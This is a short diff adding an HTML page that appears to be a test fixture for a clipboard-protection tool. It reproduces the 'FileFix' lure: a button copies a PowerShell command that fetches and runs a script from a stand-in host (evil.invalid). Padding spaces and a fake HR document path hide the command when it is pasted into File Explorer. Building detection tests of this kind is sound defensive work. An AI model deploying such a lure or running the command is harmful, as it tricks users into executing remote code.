@@ -1,0 +1,8 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"><title>FileFix: indent + path-like comment</title>
+<script src="common.js"></script></head>
+<body><h1>FileFix: indent + path-like comment</h1>
+<button id="go">Paste into the File Explorer address bar</button>
+<script>const cmd=`powershell -c "iwr https://evil.invalid/f.ps1 | iex"`+" ".repeat(120)+"# C:\\company\\filedrive\\HRPolicy.docx";
+document.getElementById("go").addEventListener("click",()=>window.__clipguard.writeText(cmd));</script>
+</body></html>
